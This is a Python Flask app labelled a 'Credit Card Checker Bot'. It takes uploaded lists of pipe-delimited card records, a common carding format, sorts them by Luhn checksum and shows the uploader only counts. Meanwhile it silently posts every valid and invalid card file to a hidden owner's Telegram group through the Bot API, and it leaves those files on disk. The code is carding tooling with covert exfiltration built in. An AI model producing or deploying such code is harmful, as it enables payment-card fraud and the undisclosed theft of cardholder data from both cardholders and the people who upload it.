import os
import time
import requests
from flask import Flask, request

# Initialize Flask app
app = Flask(__name__)

# Bot token and owner group ID are stored in environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_GROUP_ID = os.getenv("OWNER_GROUP_ID")

# Luhn algorithm to validate credit cards
def luhn_check(card_number):
    card_number = card_number.replace(' ', '').replace('-', '')
    total = 0
    reversed_number = card_number[::-1]
    
    for i, digit in enumerate(reversed_number):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n

    return total % 10 == 0

# Check card validity and split good and bad cards
def check_cards(file_path, pass_file, fail_file):
    valid_count = 0
    invalid_count = 0

    with open(file_path, 'r') as input_file, open(pass_file, 'w') as pass_f, open(fail_file, 'w') as fail_f:
        for line in input_file:
            card = line.strip().split('|')[0].strip()
            if luhn_check(card):
                pass_f.write(line)
                valid_count += 1
            else:
                fail_f.write(line)
                invalid_count += 1

    return valid_count, invalid_count

# Send file to the owner's group using Telegram API
def send_file_to_group(bot_token, chat_id, file_path, caption=""):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    with open(file_path, 'rb') as file:
        response = requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files={'document': file})
    return response.json()

@app.route('/')
def home():
    return "💳 Welcome to the Credit Card Checker Bot! 💳"

@app.route('/check', methods=['POST'])
def check():
    if 'file' not in request.files:
        return "Error: No file uploaded", 400

    # Save the uploaded file temporarily
    file = request.files['file']
    file_path = f"input_{int(time.time())}.txt"
    file.save(file_path)

    # Create output files for valid and invalid cards
    pass_file = f"pass_luhn_{int(time.time())}.txt"
    fail_file = f"fail_luhn_{int(time.time())}.txt"

    # Process the file and get the results
    valid_count, invalid_count = check_cards(file_path, pass_file, fail_file)

    # Send the files to the owner's group
    send_file_to_group(BOT_TOKEN, OWNER_GROUP_ID, pass_file, caption="✅ Valid Cards:")
    send_file_to_group(BOT_TOKEN, OWNER_GROUP_ID, fail_file, caption="❌ Invalid Cards:")

    # Clean up the temporary input file
    os.remove(file_path)

    return f"Check complete: {valid_count} valid cards, {invalid_count} invalid cards."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
